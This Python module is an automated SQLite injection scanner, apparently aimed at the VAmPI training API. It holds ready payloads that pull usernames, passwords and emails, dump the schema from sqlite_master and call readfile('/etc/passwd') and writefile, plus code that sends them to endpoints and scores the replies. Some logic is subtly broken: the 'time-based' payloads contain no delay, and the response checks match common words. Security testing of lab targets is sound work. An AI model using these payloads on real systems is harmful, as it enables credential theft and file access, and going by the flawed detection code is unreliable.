#!/usr/bin/env python3
"""
SQLite-Specific Vulnerability Testing Module

This module implements SQLite-specific vulnerability patterns and testing
techniques specifically designed for VAmPI applications that use SQLite database.
"""

import json
import time
import asyncio
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import requests


class SQLiteTestType(Enum):
    """Types of SQLite-specific tests"""
    SCHEMA_EXTRACTION = "schema_extraction"
    DATA_EXTRACTION = "data_extraction"
    TIME_BASED_BLIND = "time_based_blind"
    ERROR_BASED = "error_based"
    BOOLEAN_BASED_BLIND = "boolean_based_blind"
    FILE_SYSTEM_ACCESS = "file_system_access"
    FUNCTION_INJECTION = "function_injection"
    VERSION_DETECTION = "version_detection"


@dataclass
class SQLiteTest:
    """SQLite-specific test definition"""
    test_type: SQLiteTestType
    name: str
    description: str
    payload: str
    expected_behavior: str
    vulnerability_indicators: List[str]
    severity: str
    category: str
    target_endpoints: List[str]
    prerequisites: List[str]


class SQLiteSpecificTester:
    """Tester for SQLite-specific vulnerabilities"""
    
    def __init__(self, base_url: str, session):
        self.base_url = base_url
        self.session = session
        self.sqlite_patterns = self._initialize_sqlite_patterns()
    
    def _initialize_sqlite_patterns(self) -> List[SQLiteTest]:
        """Initialize SQLite-specific vulnerability patterns"""
        patterns = []
        
        # Schema extraction patterns
        schema_patterns = [
            SQLiteTest(
                test_type=SQLiteTestType.SCHEMA_EXTRACTION,
                name="SQLite Master Table Schema Extraction",
                description="Extract complete database schema from sqlite_master",
                payload="1' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
                expected_behavior="Returns complete table definitions",
                vulnerability_indicators=["CREATE TABLE", "sqlite_master", "table definition"],
                severity="High",
                category="Information Disclosure",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.SCHEMA_EXTRACTION,
                name="SQLite Table Name Enumeration",
                description="Enumerate all table names in SQLite database",
                payload="1' UNION SELECT name FROM sqlite_master WHERE type='table'--",
                expected_behavior="Returns list of all table names",
                vulnerability_indicators=["users", "books", "table name", "sqlite_master"],
                severity="Medium",
                category="Information Disclosure",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.SCHEMA_EXTRACTION,
                name="SQLite Column Information Extraction",
                description="Extract column information from specific tables",
                payload="1' UNION SELECT sql FROM sqlite_master WHERE name='users'--",
                expected_behavior="Returns table structure for users table",
                vulnerability_indicators=["CREATE TABLE users", "column definition", "PRIMARY KEY"],
                severity="Medium",
                category="Information Disclosure",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "users table exists"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.SCHEMA_EXTRACTION,
                name="SQLite Index Information Extraction",
                description="Extract index information from sqlite_master",
                payload="1' UNION SELECT sql FROM sqlite_master WHERE type='index'--",
                expected_behavior="Returns index definitions",
                vulnerability_indicators=["CREATE INDEX", "index definition", "sqlite_master"],
                severity="Low",
                category="Information Disclosure",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "indexes exist"]
            )
        ]
        
        # Data extraction patterns
        data_patterns = [
            SQLiteTest(
                test_type=SQLiteTestType.DATA_EXTRACTION,
                name="SQLite User Credentials Extraction",
                description="Extract user credentials from users table",
                payload="1' UNION SELECT username,password,email FROM users LIMIT 1--",
                expected_behavior="Returns user credentials",
                vulnerability_indicators=["username", "password", "email", "user data"],
                severity="Critical",
                category="Data Extraction",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "users table with credentials"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.DATA_EXTRACTION,
                name="SQLite Admin User Extraction",
                description="Extract admin user information",
                payload="1' UNION SELECT * FROM users WHERE username='admin'--",
                expected_behavior="Returns admin user data",
                vulnerability_indicators=["admin", "username", "password", "role"],
                severity="Critical",
                category="Data Extraction",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "admin user exists"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.DATA_EXTRACTION,
                name="SQLite Book Data Extraction",
                description="Extract book information from books table",
                payload="1' UNION SELECT title,author,isbn FROM books LIMIT 1--",
                expected_behavior="Returns book data",
                vulnerability_indicators=["title", "author", "isbn", "book data"],
                severity="Medium",
                category="Data Extraction",
                target_endpoints=["/books/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "books table exists"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.DATA_EXTRACTION,
                name="SQLite All Users Extraction",
                description="Extract all user information",
                payload="1' UNION SELECT COUNT(*) FROM users--",
                expected_behavior="Returns total number of users",
                vulnerability_indicators=["count", "users", "total"],
                severity="Medium",
                category="Data Extraction",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "users table exists"]
            )
        ]
        
        # Time-based blind injection patterns
        time_based_patterns = [
            SQLiteTest(
                test_type=SQLiteTestType.TIME_BASED_BLIND,
                name="SQLite Time-Based Table Existence Check",
                description="Time-based blind injection to check table existence",
                payload="1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='users')>0 AND (SELECT 1 FROM sqlite_master LIMIT 1 OFFSET 0) AND 1=1--",
                expected_behavior="Delayed response if users table exists",
                vulnerability_indicators=["delayed response", "time-based injection"],
                severity="High",
                category="Blind SQL Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "time-based injection possible"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.TIME_BASED_BLIND,
                name="SQLite Time-Based Column Existence Check",
                description="Time-based blind injection to check column existence",
                payload="1' AND (SELECT COUNT(*) FROM sqlite_master WHERE name='users' AND sql LIKE '%password%')>0 AND (SELECT 1 FROM sqlite_master LIMIT 1 OFFSET 0) AND 1=1--",
                expected_behavior="Delayed response if password column exists",
                vulnerability_indicators=["delayed response", "time-based injection"],
                severity="High",
                category="Blind SQL Injection",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "time-based injection possible"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.TIME_BASED_BLIND,
                name="SQLite Time-Based Data Existence Check",
                description="Time-based blind injection to check data existence",
                payload="1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 AND (SELECT 1 FROM sqlite_master LIMIT 1 OFFSET 0) AND 1=1--",
                expected_behavior="Delayed response if admin user exists",
                vulnerability_indicators=["delayed response", "time-based injection"],
                severity="High",
                category="Blind SQL Injection",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "time-based injection possible"]
            )
        ]
        
        # Error-based injection patterns
        error_based_patterns = [
            SQLiteTest(
                test_type=SQLiteTestType.ERROR_BASED,
                name="SQLite Error-Based Table Enumeration",
                description="Extract table names through error messages",
                payload="1' AND (SELECT COUNT(*) FROM sqlite_master WHERE name='nonexistent_table')--",
                expected_behavior="Returns error message revealing database structure",
                vulnerability_indicators=["no such table", "sqlite error", "table does not exist"],
                severity="Medium",
                category="Error-Based SQL Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "Error messages enabled"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.ERROR_BASED,
                name="SQLite Error-Based Column Enumeration",
                description="Extract column names through error messages",
                payload="1' AND (SELECT nonexistent_column FROM users)--",
                expected_behavior="Returns error message revealing column names",
                vulnerability_indicators=["no such column", "sqlite error", "column does not exist"],
                severity="Medium",
                category="Error-Based SQL Injection",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "Error messages enabled"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.ERROR_BASED,
                name="SQLite Error-Based Data Extraction",
                description="Extract data through error messages",
                payload="1' AND (SELECT sql FROM sqlite_master WHERE name='users' AND type='table')--",
                expected_behavior="Returns error message revealing table structure",
                vulnerability_indicators=["sqlite error", "table structure", "CREATE TABLE"],
                severity="Medium",
                category="Error-Based SQL Injection",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "Error messages enabled"]
            )
        ]
        
        # Boolean-based blind injection patterns
        boolean_based_patterns = [
            SQLiteTest(
                test_type=SQLiteTestType.BOOLEAN_BASED_BLIND,
                name="SQLite Boolean-Based Table Count Check",
                description="Boolean-based blind injection to check table count",
                payload="1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--",
                expected_behavior="Different response based on table count",
                vulnerability_indicators=["different response", "boolean-based injection"],
                severity="High",
                category="Blind SQL Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "boolean-based injection possible"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.BOOLEAN_BASED_BLIND,
                name="SQLite Boolean-Based User Count Check",
                description="Boolean-based blind injection to check user count",
                payload="1' AND (SELECT COUNT(*) FROM users)>0--",
                expected_behavior="Different response based on user count",
                vulnerability_indicators=["different response", "boolean-based injection"],
                severity="High",
                category="Blind SQL Injection",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "boolean-based injection possible"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.BOOLEAN_BASED_BLIND,
                name="SQLite Boolean-Based Admin User Check",
                description="Boolean-based blind injection to check admin user existence",
                payload="1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--",
                expected_behavior="Different response if admin user exists",
                vulnerability_indicators=["different response", "boolean-based injection"],
                severity="High",
                category="Blind SQL Injection",
                target_endpoints=["/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "boolean-based injection possible"]
            )
        ]
        
        # File system access patterns
        file_system_patterns = [
            SQLiteTest(
                test_type=SQLiteTestType.FILE_SYSTEM_ACCESS,
                name="SQLite Load Extension Test",
                description="Test SQLite load_extension function",
                payload="1' UNION SELECT load_extension('test')--",
                expected_behavior="May reveal file system access capabilities",
                vulnerability_indicators=["load_extension", "file system access", "extension loading"],
                severity="High",
                category="File System Access",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "Load extension enabled"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.FILE_SYSTEM_ACCESS,
                name="SQLite Readfile Function Test",
                description="Test SQLite readfile function",
                payload="1' UNION SELECT readfile('/etc/passwd')--",
                expected_behavior="May read system files",
                vulnerability_indicators=["readfile", "file content", "system file access"],
                severity="Critical",
                category="File System Access",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "Readfile function enabled"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.FILE_SYSTEM_ACCESS,
                name="SQLite Writefile Function Test",
                description="Test SQLite writefile function",
                payload="1' UNION SELECT writefile('/tmp/test.txt', 'test content')--",
                expected_behavior="May write to file system",
                vulnerability_indicators=["writefile", "file writing", "file system write access"],
                severity="Critical",
                category="File System Access",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database", "Writefile function enabled"]
            )
        ]
        
        # Function injection patterns
        function_patterns = [
            SQLiteTest(
                test_type=SQLiteTestType.FUNCTION_INJECTION,
                name="SQLite Random Function Test",
                description="Test SQLite random function",
                payload="1' UNION SELECT hex(randomblob(10))--",
                expected_behavior="Returns random hex data",
                vulnerability_indicators=["randomblob", "hex", "random data"],
                severity="Low",
                category="Function Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.FUNCTION_INJECTION,
                name="SQLite Quote Function Test",
                description="Test SQLite quote function",
                payload="1' UNION SELECT quote(randomblob(10))--",
                expected_behavior="Returns quoted random data",
                vulnerability_indicators=["quote", "quoted data", "randomblob"],
                severity="Low",
                category="Function Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.FUNCTION_INJECTION,
                name="SQLite Zeroblob Function Test",
                description="Test SQLite zeroblob function",
                payload="1' UNION SELECT zeroblob(10)--",
                expected_behavior="Returns zero-filled blob",
                vulnerability_indicators=["zeroblob", "zero-filled data"],
                severity="Low",
                category="Function Injection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database"]
            )
        ]
        
        # Version detection patterns
        version_patterns = [
            SQLiteTest(
                test_type=SQLiteTestType.VERSION_DETECTION,
                name="SQLite Version Detection",
                description="Detect SQLite version",
                payload="1' UNION SELECT sqlite_version()--",
                expected_behavior="Returns SQLite version",
                vulnerability_indicators=["sqlite version", "version number", "sqlite"],
                severity="Low",
                category="Version Detection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database"]
            ),
            
            SQLiteTest(
                test_type=SQLiteTestType.VERSION_DETECTION,
                name="SQLite Source ID Detection",
                description="Detect SQLite source ID",
                payload="1' UNION SELECT sqlite_source_id()--",
                expected_behavior="Returns SQLite source ID",
                vulnerability_indicators=["sqlite source", "source id", "sqlite"],
                severity="Low",
                category="Version Detection",
                target_endpoints=["/books/v1", "/users/v1"],
                prerequisites=["SQL injection vulnerability", "SQLite database"]
            )
        ]
        
        # Combine all patterns
        patterns.extend(schema_patterns)
        patterns.extend(data_patterns)
        patterns.extend(time_based_patterns)
        patterns.extend(error_based_patterns)
        patterns.extend(boolean_based_patterns)
        patterns.extend(file_system_patterns)
        patterns.extend(function_patterns)
        patterns.extend(version_patterns)
        
        return patterns
    
    async def test_sqlite_schema_extraction(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test SQLite schema extraction vulnerabilities"""
        results = []
        schema_tests = [p for p in self.sqlite_patterns if p.test_type == SQLiteTestType.SCHEMA_EXTRACTION]
        
        for test in schema_tests:
            if any(target in endpoint for target in test.target_endpoints):
                result = await self._execute_sqlite_test(endpoint, method, parameter, test)
                results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "sqlite_schema_extraction",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_sqlite_data_extraction(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test SQLite data extraction vulnerabilities"""
        results = []
        data_tests = [p for p in self.sqlite_patterns if p.test_type == SQLiteTestType.DATA_EXTRACTION]
        
        for test in data_tests:
            if any(target in endpoint for target in test.target_endpoints):
                result = await self._execute_sqlite_test(endpoint, method, parameter, test)
                results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "sqlite_data_extraction",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_sqlite_time_based_blind(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test SQLite time-based blind injection vulnerabilities"""
        results = []
        time_based_tests = [p for p in self.sqlite_patterns if p.test_type == SQLiteTestType.TIME_BASED_BLIND]
        
        for test in time_based_tests:
            if any(target in endpoint for target in test.target_endpoints):
                result = await self._execute_sqlite_time_based_test(endpoint, method, parameter, test)
                results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "sqlite_time_based_blind",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_sqlite_error_based(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test SQLite error-based injection vulnerabilities"""
        results = []
        error_based_tests = [p for p in self.sqlite_patterns if p.test_type == SQLiteTestType.ERROR_BASED]
        
        for test in error_based_tests:
            if any(target in endpoint for target in test.target_endpoints):
                result = await self._execute_sqlite_test(endpoint, method, parameter, test)
                results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "sqlite_error_based",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_sqlite_boolean_based_blind(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test SQLite boolean-based blind injection vulnerabilities"""
        results = []
        boolean_based_tests = [p for p in self.sqlite_patterns if p.test_type == SQLiteTestType.BOOLEAN_BASED_BLIND]
        
        for test in boolean_based_tests:
            if any(target in endpoint for target in test.target_endpoints):
                result = await self._execute_sqlite_boolean_based_test(endpoint, method, parameter, test)
                results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "sqlite_boolean_based_blind",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_sqlite_file_system_access(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test SQLite file system access vulnerabilities"""
        results = []
        file_system_tests = [p for p in self.sqlite_patterns if p.test_type == SQLiteTestType.FILE_SYSTEM_ACCESS]
        
        for test in file_system_tests:
            if any(target in endpoint for target in test.target_endpoints):
                result = await self._execute_sqlite_test(endpoint, method, parameter, test)
                results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "sqlite_file_system_access",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_sqlite_function_injection(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test SQLite function injection vulnerabilities"""
        results = []
        function_tests = [p for p in self.sqlite_patterns if p.test_type == SQLiteTestType.FUNCTION_INJECTION]
        
        for test in function_tests:
            if any(target in endpoint for target in test.target_endpoints):
                result = await self._execute_sqlite_test(endpoint, method, parameter, test)
                results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "sqlite_function_injection",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def test_sqlite_version_detection(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Test SQLite version detection"""
        results = []
        version_tests = [p for p in self.sqlite_patterns if p.test_type == SQLiteTestType.VERSION_DETECTION]
        
        for test in version_tests:
            if any(target in endpoint for target in test.target_endpoints):
                result = await self._execute_sqlite_test(endpoint, method, parameter, test)
                results.append(result)
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "sqlite_version_detection",
            "results": results,
            "total_tests": len(results),
            "vulnerabilities_found": sum(1 for r in results if r.get("vulnerability_found", False))
        }
    
    async def _execute_sqlite_test(self, endpoint: str, method: str, parameter: str, test: SQLiteTest) -> Dict[str, Any]:
        """Execute a SQLite-specific test"""
        try:
            url = f"{self.base_url}{endpoint}"
            
            # Prepare request based on method
            if method.upper() == "GET":
                response = self.session.get(url, params={parameter: test.payload}, timeout=30)
            elif method.upper() == "POST":
                response = self.session.post(url, json={parameter: test.payload}, timeout=30)
            elif method.upper() == "PUT":
                response = self.session.put(url, json={parameter: test.payload}, timeout=30)
            else:
                response = self.session.request(method, url, json={parameter: test.payload}, timeout=30)
            
            # Analyze response for vulnerability indicators
            vulnerability_found = self._analyze_sqlite_response(response, test)
            
            return {
                "test_name": test.name,
                "test_type": test.test_type.value,
                "payload": test.payload,
                "expected_behavior": test.expected_behavior,
                "status_code": response.status_code,
                "response_length": len(response.text),
                "response_time": response.elapsed.total_seconds(),
                "vulnerability_found": vulnerability_found,
                "vulnerability_indicators": self._get_sqlite_vulnerability_indicators(response, test),
                "severity": test.severity,
                "category": test.category
            }
            
        except Exception as e:
            return {
                "test_name": test.name,
                "test_type": test.test_type.value,
                "payload": test.payload,
                "error": str(e),
                "vulnerability_found": False,
                "severity": test.severity,
                "category": test.category
            }
    
    async def _execute_sqlite_time_based_test(self, endpoint: str, method: str, parameter: str, test: SQLiteTest) -> Dict[str, Any]:
        """Execute a SQLite time-based test"""
        try:
            url = f"{self.base_url}{endpoint}"
            
            # Measure baseline response time
            baseline_start = time.time()
            if method.upper() == "GET":
                baseline_response = self.session.get(url, params={parameter: "1"}, timeout=30)
            else:
                baseline_response = self.session.request(method, url, json={parameter: "1"}, timeout=30)
            baseline_time = time.time() - baseline_start
            
            # Measure payload response time
            payload_start = time.time()
            if method.upper() == "GET":
                payload_response = self.session.get(url, params={parameter: test.payload}, timeout=30)
            else:
                payload_response = self.session.request(method, url, json={parameter: test.payload}, timeout=30)
            payload_time = time.time() - payload_start
            
            # Check for time-based injection (payload should take significantly longer)
            time_difference = payload_time - baseline_time
            vulnerability_found = time_difference > 2.0  # 2 second threshold
            
            return {
                "test_name": test.name,
                "test_type": test.test_type.value,
                "payload": test.payload,
                "expected_behavior": test.expected_behavior,
                "baseline_time": baseline_time,
                "payload_time": payload_time,
                "time_difference": time_difference,
                "status_code": payload_response.status_code,
                "response_length": len(payload_response.text),
                "vulnerability_found": vulnerability_found,
                "vulnerability_indicators": ["Time-based injection detected"] if vulnerability_found else [],
                "severity": test.severity,
                "category": test.category
            }
            
        except Exception as e:
            return {
                "test_name": test.name,
                "test_type": test.test_type.value,
                "payload": test.payload,
                "error": str(e),
                "vulnerability_found": False,
                "severity": test.severity,
                "category": test.category
            }
    
    async def _execute_sqlite_boolean_based_test(self, endpoint: str, method: str, parameter: str, test: SQLiteTest) -> Dict[str, Any]:
        """Execute a SQLite boolean-based test"""
        try:
            url = f"{self.base_url}{endpoint}"
            
            # Test with true condition
            true_start = time.time()
            if method.upper() == "GET":
                true_response = self.session.get(url, params={parameter: test.payload}, timeout=30)
            else:
                true_response = self.session.request(method, url, json={parameter: test.payload}, timeout=30)
            true_time = time.time() - true_start
            
            # Test with false condition (modify payload to make it false)
            false_payload = test.payload.replace(">0", "=0")
            false_start = time.time()
            if method.upper() == "GET":
                false_response = self.session.get(url, params={parameter: false_payload}, timeout=30)
            else:
                false_response = self.session.request(method, url, json={parameter: false_payload}, timeout=30)
            false_time = time.time() - false_start
            
            # Check for boolean-based injection (different responses)
            vulnerability_found = (
                true_response.status_code != false_response.status_code or
                len(true_response.text) != len(false_response.text) or
                abs(true_time - false_time) > 0.5
            )
            
            return {
                "test_name": test.name,
                "test_type": test.test_type.value,
                "payload": test.payload,
                "expected_behavior": test.expected_behavior,
                "true_response_code": true_response.status_code,
                "false_response_code": false_response.status_code,
                "true_response_length": len(true_response.text),
                "false_response_length": len(false_response.text),
                "true_time": true_time,
                "false_time": false_time,
                "vulnerability_found": vulnerability_found,
                "vulnerability_indicators": ["Boolean-based injection detected"] if vulnerability_found else [],
                "severity": test.severity,
                "category": test.category
            }
            
        except Exception as e:
            return {
                "test_name": test.name,
                "test_type": test.test_type.value,
                "payload": test.payload,
                "error": str(e),
                "vulnerability_found": False,
                "severity": test.severity,
                "category": test.category
            }
    
    def _analyze_sqlite_response(self, response, test: SQLiteTest) -> bool:
        """Analyze response for SQLite vulnerability indicators"""
        response_text = response.text.lower()
        
        # Check for specific vulnerability indicators
        for indicator in test.vulnerability_indicators:
            if indicator.lower() in response_text:
                return True
        
        # Check for SQLite-specific error messages
        sqlite_errors = [
            "sqlite error", "no such table", "no such column", "near syntax error",
            "sqlite_master", "table does not exist", "column does not exist"
        ]
        
        for error in sqlite_errors:
            if error in response_text:
                return True
        
        # Check for successful data extraction
        if test.test_type == SQLiteTestType.DATA_EXTRACTION:
            data_indicators = ["username", "password", "email", "title", "author", "isbn"]
            return any(indicator in response_text for indicator in data_indicators)
        
        # Check for schema information
        if test.test_type == SQLiteTestType.SCHEMA_EXTRACTION:
            schema_indicators = ["create table", "table definition", "column definition", "primary key"]
            return any(indicator in response_text for indicator in schema_indicators)
        
        return False
    
    def _get_sqlite_vulnerability_indicators(self, response, test: SQLiteTest) -> List[str]:
        """Get specific SQLite vulnerability indicators from response"""
        indicators = []
        response_text = response.text.lower()
        
        if test.test_type == SQLiteTestType.DATA_EXTRACTION:
            if "username" in response_text:
                indicators.append("Username data extracted")
            if "password" in response_text:
                indicators.append("Password data extracted")
            if "email" in response_text:
                indicators.append("Email data extracted")
            if "admin" in response_text:
                indicators.append("Admin data extracted")
        
        elif test.test_type == SQLiteTestType.SCHEMA_EXTRACTION:
            if "create table" in response_text:
                indicators.append("Table schema extracted")
            if "sqlite_master" in response_text:
                indicators.append("SQLite master table accessed")
            if "column" in response_text:
                indicators.append("Column information extracted")
        
        elif test.test_type == SQLiteTestType.ERROR_BASED:
            if "sqlite error" in response_text:
                indicators.append("SQLite error message revealed")
            if "no such table" in response_text:
                indicators.append("Table existence information revealed")
            if "no such column" in response_text:
                indicators.append("Column existence information revealed")
        
        elif test.test_type == SQLiteTestType.FILE_SYSTEM_ACCESS:
            if "load_extension" in response_text:
                indicators.append("Load extension function accessible")
            if "readfile" in response_text:
                indicators.append("Readfile function accessible")
            if "writefile" in response_text:
                indicators.append("Writefile function accessible")
        
        elif test.test_type == SQLiteTestType.VERSION_DETECTION:
            if "sqlite version" in response_text:
                indicators.append("SQLite version information revealed")
            if "sqlite source" in response_text:
                indicators.append("SQLite source information revealed")
        
        return indicators
    
    async def run_comprehensive_sqlite_tests(self, endpoint: str, method: str, parameter: str) -> Dict[str, Any]:
        """Run all SQLite-specific tests for an endpoint"""
        all_results = {}
        
        # Run all test types
        test_functions = [
            ("schema_extraction", self.test_sqlite_schema_extraction),
            ("data_extraction", self.test_sqlite_data_extraction),
            ("time_based_blind", self.test_sqlite_time_based_blind),
            ("error_based", self.test_sqlite_error_based),
            ("boolean_based_blind", self.test_sqlite_boolean_based_blind),
            ("file_system_access", self.test_sqlite_file_system_access),
            ("function_injection", self.test_sqlite_function_injection),
            ("version_detection", self.test_sqlite_version_detection)
        ]
        
        for test_name, test_func in test_functions:
            try:
                result = await test_func(endpoint, method, parameter)
                all_results[test_name] = result
            except Exception as e:
                all_results[test_name] = {
                    "error": str(e),
                    "vulnerabilities_found": 0
                }
        
        # Calculate totals
        total_tests = sum(result.get("total_tests", 0) for result in all_results.values())
        total_vulnerabilities = sum(result.get("vulnerabilities_found", 0) for result in all_results.values())
        
        return {
            "endpoint": endpoint,
            "method": method,
            "parameter": parameter,
            "test_type": "comprehensive_sqlite_testing",
            "results": all_results,
            "total_tests": total_tests,
            "total_vulnerabilities": total_vulnerabilities,
            "vulnerability_rate": (total_vulnerabilities / total_tests * 100) if total_tests > 0 else 0
        }